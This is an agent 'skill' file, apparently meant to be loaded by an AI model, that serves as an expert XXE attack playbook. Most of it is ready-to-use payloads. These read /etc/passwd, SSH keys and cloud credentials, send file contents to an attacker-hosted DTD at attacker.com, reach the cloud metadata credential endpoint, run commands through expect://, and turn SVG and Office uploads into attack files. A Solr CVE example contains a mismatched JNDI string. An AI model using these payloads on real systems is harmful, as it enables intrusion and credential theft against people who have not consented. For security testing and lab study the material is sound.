---
name: xxe-xml-external-entity
description: >-
  XXE playbook. Use when XML, SVG, OOXML, SOAP, or parser-driven imports may resolve external entities, files, or internal network resources.
---

# SKILL: XML External Entity Injection (XXE) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert XXE techniques. Covers all injection contexts (SOAP, REST JSON→XML parsers, Office files, SVG), OOB exfiltration (critical when direct read fails), blind XXE detection, and XXE-to-SSRF chain. Base models often miss OOB and non-XML context XXE.

## 0. RELATED ROUTING

Also load:

- [upload insecure files](../../file/upload-insecure-files/SKILL.md) when XXE is reachable through SVG, OOXML, import, or preview pipelines


## 1. CLASSIC XXE PAYLOAD

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

If `/etc/passwd` reflects in response → confirmed file read.

---

## 2. ATTACK SURFACE DISCOVERY

### Direct XML Inputs
- SOAP endpoints (`text/xml`, `application/soap+xml`)
- REST APIs accepting `application/xml`
- File upload: `.xlsx`, `.docx`, `.pptx` (Office Open XML)
- SVG uploads (SVG is XML)
- RSS/Atom feed parsers
- Web services with XML config import

### Non-Obvious XML Processing
Change `Content-Type` header on **any** JSON POST to:
```
Content-Type: application/xml
```
Then rewrite body as XML — many backends use dual-format parsers or auto-detect.

### PDF Generators
Some HTML→PDF tools (wkhtmltopdf, PrinceXML) execute SSRF via embedded URLs but also parse external entities in SVG/XML included in the HTML.

---

## 3. OOB (OUT-OF-BAND) XXE — CRITICAL

Use when direct entity reflection fails (server parses but doesn't echo entity content):

### Step 1: Blind detection
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/">]>
<root>&xxe;</root>
```
DNS/HTTP hit to collaborator → confirms XXE (even if no file content returned).

### Step 2: OOB file exfiltration via attacker-hosted DTD
**Attacker's server hosts a malicious DTD** at `http://attacker.com/evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%exfil;
```

**Payload sent to target**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&exfiltrate;</root>
```
File contents appear in attacker's HTTP server request log.

### Step 3: Error-based OOB (alternative when HTTP blocked)
Use intentional error to leak data in error message:
```xml
<!-- attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///NONEXISTENT/%file;'>">
%eval;
%error;
```

---

## 4. XXE FILE READ TARGETS

**Linux**:
```
/etc/passwd
/etc/shadow  (requires root)
/etc/hosts
/proc/self/environ      ← environment variables (DB creds, API keys)
/proc/self/cmdline      ← process command line
/var/log/apache2/access.log  ← may contain passwords in URLs
/home/USER/.ssh/id_rsa  ← SSH private key
/home/USER/.aws/credentials ← AWS keys
/home/USER/.bash_history
```

**Windows**:
```
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config    ← ASP.NET connection strings
C:\xampp\htdocs\wp-config.php    ← WordPress DB credentials
C:\Users\Administrator\.ssh\id_rsa
```

---

## 5. SVG XXE (file upload context)

When SVG uploads are accepted and served/processed:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="100">
  <text font-size="16">&xxe;</text>
</svg>
```
Upload as `.svg` → `GET /uploads/file.svg` → file contents in response.

---

## 6. OFFICE FILE XXE (docx/xlsx/pptx)

Office files are ZIP archives containing XML. Inject into `[Content_Types].xml` or `word/document.xml`:

```bash
# Step 1: extract
unzip original.docx -d extracted/

# Step 2: edit word/document.xml — add malicious DTD
# Add after <?xml version="1.0" encoding="UTF-8" standalone="yes"?>:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Then use &xxe; inside document text

# Step 3: repackage
cd extracted && zip -r ../malicious.docx .
```

---

## 7. SOAP ENDPOINT XXE

SOAP requests parse XML by definition. Inject external entity into SOAP envelope:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <id>&xxe;</id>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

---

## 8. XXE → SSRF CHAIN

XXE external entity can point to internal HTTP endpoints (identical to SSRF):
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```
This combines XXE file read + SSRF into a single payload.

---

## 9. XInclude ATTACK

When server-side processes XInclude (import XML from another source), but you can't control the DOCTYPE:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

Works in: Apache Cocoon, Xerces-J, libxml2 with XInclude support enabled.

---

## 10. PROTOCOL HANDLERS IN XXE

```xml
<!-- HTTP (SSRF) -->
<!ENTITY xxe SYSTEM "http://internal.company.com/admin/">

<!-- File read -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- PHP wrapper (if PHP with libxml2) -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!-- Decode base64 in response to get file contents -->

<!-- FTP (exfil / port scan) -->
<!ENTITY xxe SYSTEM "ftp://attacker.com:21/x">

<!-- Gopher (Redis, SMTP) -->
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/info%0d%0a">
```

---

## 11. BYPASSING DEFENSES

### Parser blocks DOCTYPE
Try XInclude (no DOCTYPE needed, see §9).

### Only allows specific XML schemas
If schema validation occurs: inject comments or CDATA after schema validation but before entity processing.

### Response encoding issues (binary in response)
Use PHP filter for base64:
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### Network restrictions on OOB
Use DNS-only OOB via `SYSTEM "file://HASH.attacker.com"` — no HTTP required, DNS lookup leaks data.

---

## 12. QUICK DETECTION CHECKLIST

```
□ Find XML input point (or JSON→XML transformation)
□ Send basic entity: <!ENTITY xxe "test"> → &xxe; in body → does "test" reflect?
□ If yes → file read: SYSTEM "file:///etc/passwd"
□ If no reflection → OOB test via Collaborator URL
□ If OOB hit → set up attacker DTD for file exfiltration
□ Try SVG upload with XXE
□ Try Content-Type: application/xml on JSON endpoints
□ Try XInclude if DOCTYPE-based fails
```

---

## 13. LOCAL DTD INJECTION (BLIND XXE AMPLIFICATION)

When external entities are blocked but local DTD files exist on the server:

### Technique

```xml
<!-- Override an entity defined in a LOCAL DTD file -->
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

### Common Local DTD Paths

#### Linux

```
/usr/share/yelp/dtd/docbookx.dtd           # GNOME Help
/usr/share/xml/fontconfig/fonts.dtd         # Fontconfig
/usr/share/sgml/docbook/xml-dtd-*/docbookx.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd
/usr/share/struts/struts-config_1_0.dtd     # Apache Struts
/usr/share/nmap/nmap.dtd                    # Nmap
/opt/zaproxy/xml/alert.dtd                  # OWASP ZAP
```

#### Windows

```
C:\Windows\System32\wbem\xml\cim20.dtd            # WMI
C:\Windows\System32\wbem\xml\wmi20.dtd             # WMI
C:\Program Files\IBM\WebSphere\*.dtd               # WebSphere
C:\Program Files (x86)\Lotus\*.dtd                 # Lotus Notes
```

#### Inside JAR Files (Java Applications)

```
jar:file:///usr/share/java/tomcat-*.jar!/javax/servlet/resources/web-app_2_3.dtd
jar:file:///opt/wildfly/modules/*.jar!/org/jboss/as/*.dtd
file:///usr/share/java/struts2-core-*.jar!/struts-2.5.dtd
```

### Why This Works

- External connections blocked (firewall/WAF/egress filter)
- But file:// to LOCAL files is usually allowed
- Local DTD is trusted → entity overrides inject attacker-controlled definitions
- Error messages or blind extraction via file:// still works

## GENERIC_NOTE_BLIND_XXE_COLLABORATOR_GATE_20260805

- For blind XXE labs, separate parser differential proof from OOB proof: content-type acceptance and entity-handling behavior alone do not solve the lab.
- If internal and parameter-entity branches are blocked while external general entities alter application behavior, record that as parser-path evidence, not as completed OOB exfiltration.
- When the lab explicitly requires Burp Collaborator and the current automation surface cannot generate or poll a Collaborator payload, classify the remaining gap as an environment or tooling gate and timebox accordingly.
- Keep long-term notes generic; store the parser matrix, the missing OOB observation gate, and the skip condition, but omit hosts, payload literals, and any unavailable secret material.

## GENERIC_NOTE_BLIND_XXE_PARAMETER_ENTITY_COLLABORATOR_GATE_20260805

- For blind XXE parameter-entity labs, start with a parser matrix that compares plain XML, regular external entities, and external parameter entities on the live endpoint.
- If regular external entities are blocked with a security error while parameter entities reach a distinct XML parsing path, record that as the key parser differential before attempting OOB proof.
- When the public callback surface is unstable and no Collaborator generation path is available, classify the unresolved step as an OOB tooling gate instead of continuing to tweak payload syntax blindly.
- Keep long-term notes generic; store the parser differential, the callback-surface failure mode, and the skip condition, but omit hosts, payload literals, and missing secret material.


## Extended cases merged from SCENARIOS.md

## 1. CVE Case: Apache Solr XXE + RCE (CVE-2017-12629)


Apache Solr's Config API accepts XML with external entity processing enabled, and the Velocity Response Writer allows template injection:

**XXE for file read**:
```
GET /solr/CORE/select?q=xxx&wt=xml&defType=edismax&echoParams=all&fl=id,name&sort=${jndi:ldap://attacker/x}
```

**Combined XXE + RCE chain**:
1. Use XXE to read Solr configuration and identify available cores
2. Use Config API to register a new VelocityResponseWriter with `solr.resource.loader.enabled=true`
3. Execute Velocity template with `Runtime.exec()`

---

## 2. Office Document XXE — Step-by-Step


OOXML files (`.docx`, `.xlsx`, `.pptx`) are ZIP archives containing XML:

```bash
# Step 1: Create a legitimate .docx
# Step 2: Extract
mkdir extracted && cd extracted
unzip ../document.docx

# Step 3: Inject XXE into word/document.xml
# Add after <?xml version="1.0"...?>:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Then replace a text element with &xxe;

# Step 4: Also try [Content_Types].xml:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/notify">]>

# Step 5: Repackage
zip -r ../malicious.docx .

# Step 6: Upload to target application
# If the app parses the XML → XXE triggers
```

**Common targets**: document preview, import functionality, file conversion services.

---

## 3. DOCTYPE-Based SSRF


Even when the application doesn't reflect entity values, `DOCTYPE` with `PUBLIC` or `SYSTEM` triggers an HTTP request:

```xml
<!DOCTYPE foo PUBLIC "-//attacker//DTD//EN" "http://attacker.com/notify">
<root>normal content</root>
```

The XML parser fetches the DTD from `attacker.com` — confirms SSRF even without entity reflection.

---

## 4. PHP expect:// Protocol via XXE


When PHP's `expect` extension is installed:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root>&xxe;</root>
```

The `expect://` wrapper executes the command and returns output. Rare but devastating when available.

**Check availability**: `phpinfo()` → look for "expect" in loaded extensions.

---

## 5. XXE in SOAP Web Services


SOAP endpoints parse XML by design — always test for XXE:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser><id>&xxe;</id></getUser>
  </soap:Body>
</soap:Envelope>
```

Also test the `SOAPAction` header and WSDL import endpoints.

---

## 6. Blind XXE via Error Messages


When OOB HTTP exfiltration is blocked, use error-based exfiltration:

```xml
<!-- Hosted at attacker.com/error.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser tries to open `file:///nonexistent/root:x:0:0:...` → error message contains file contents.
